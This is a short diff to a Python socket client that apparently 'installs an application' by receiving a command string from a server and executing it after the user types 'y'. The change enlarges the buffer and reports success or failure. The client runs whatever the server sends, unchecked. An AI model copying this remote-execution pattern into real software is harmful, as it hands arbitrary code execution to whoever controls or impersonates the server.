@@ -4,7 +4,7 @@ from colorama import init
 from termcolor import colored
 init()
 
-SIZE1 = 192512
+SIZE1 = 192512232
 FORMAT = "utf-8"
 
 def clientFunction(IP="127.0.0.1",PORT=9999):
@@ -36,9 +36,12 @@ def clientFunction(IP="127.0.0.1",PORT=9999):
         if choice == "y":
             print(colored("Installing the application...", "blue"))
             command = client.recv(SIZE1).decode(FORMAT)
-            execute(command)
+            status = execute(command)
+            if status:
+                print(colored("Application Installed", "green"))
+            else:
+                print(colored("[INSTALLATION FAILED] Program was not installed","red"))
 
-        print(colored("Application Installed", "green"))
         client.close()
         print(colored(f"\n[DISCONNECTED] {ADDR} disconnected.","yellow"))
     except Exception as e:
